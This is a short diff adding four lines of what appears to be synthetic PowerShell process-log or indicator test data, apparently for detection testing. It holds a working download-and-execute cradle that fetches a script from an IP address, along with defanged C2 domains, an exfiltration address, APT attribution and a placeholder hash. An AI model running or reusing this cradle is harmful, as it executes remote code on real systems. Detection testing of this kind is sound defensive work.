@@ -1,0 +1,4 @@
+4812:powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/a.ps1')
+4812:powershell.exe C2 evil-domain[.]ru fallback cobalt-c2[.]net mutex Global\\b3hq2k
+4812:powershell.exe APT28 Fancy Bear loader exploiting CVE-2021-44228 via T1059.001 and T1190
+4812:powershell.exe exfil to admin@evil-domain[.]ru SHA256 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
